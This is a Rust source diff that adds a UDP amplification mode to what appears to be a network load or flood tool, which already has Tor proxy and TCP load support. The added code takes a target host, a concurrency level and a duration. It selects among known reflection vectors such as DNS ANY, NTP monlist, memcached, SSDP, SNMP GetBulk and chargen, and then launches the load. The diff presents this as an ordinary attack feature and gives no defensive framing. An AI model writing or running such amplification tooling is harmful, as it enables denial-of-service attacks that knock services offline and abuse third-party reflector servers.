@@ -391,6 +391,7 @@ mod types;
 mod catalog;
 mod gui;
 mod tcp;
+mod udp;
 use crate::types::*;
 
 struct ProxyPool {
@@ -4016,6 +4017,33 @@ async fn main() {
             .unwrap_or(tcp::TcpMode::GenericConnect);
 
         tcp::run_tcp_load(tcp_mode, &target, tor_proxy.clone(), tcp_concurrency, tcp_duration).await;
+        return;
+    }
+
+    // ── Protocol: UDP amplification (no proxy, requires direct socket) ──
+    if protocol == "udp" {
+        let udp_host = positional.first().cloned().unwrap_or_else(|| "127.0.0.1:53".to_string());
+        let udp_mode_str = positional.get(1).cloned().unwrap_or_else(|| "dns-any".to_string());
+        let udp_concurrency: usize = positional.get(2).and_then(|s| s.parse().ok()).unwrap_or(5);
+        let udp_duration: u64 = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(30);
+        let udp_mode = match udp_mode_str.as_str() {
+            "dns-any" | "dnsany" => udp::UdpMode::DnsAny,
+            "dns-ixfr" | "dnsixfr" => udp::UdpMode::DnsIxfr,
+            "ntp-monlist" | "ntpmonlist" => udp::UdpMode::NtpMonlist,
+            "ntp-query" | "ntpquery" => udp::UdpMode::NtpQuery,
+            "memcached" | "memcache" => udp::UdpMode::MemcachedStats,
+            "ssdp" => udp::UdpMode::SsdpDiscovery,
+            "snmp-getbulk" | "snmpbulk" | "snmp" => udp::UdpMode::SnmpGetBulk,
+            "chargen" => udp::UdpMode::CharGen,
+            "qotd" => udp::UdpMode::Qotd,
+            "memcached-get" | "memcache-get" => udp::UdpMode::MemcachedGet,
+            "generic" | "udpconnect" => udp::UdpMode::GenericUdp,
+            _ => {
+                eprintln!("Unknown UDP amplification mode: {}. Available: dns-any, dns-ixfr, ntp-monlist, ntp-query, memcached, memcached-get, ssdp, snmp-getbulk, chargen, qotd, generic", udp_mode_str);
+                return;
+            }
+        };
+        udp::run_udp_load(udp_mode, &udp_host, udp_concurrency, udp_duration).await;
         return;
     }
 
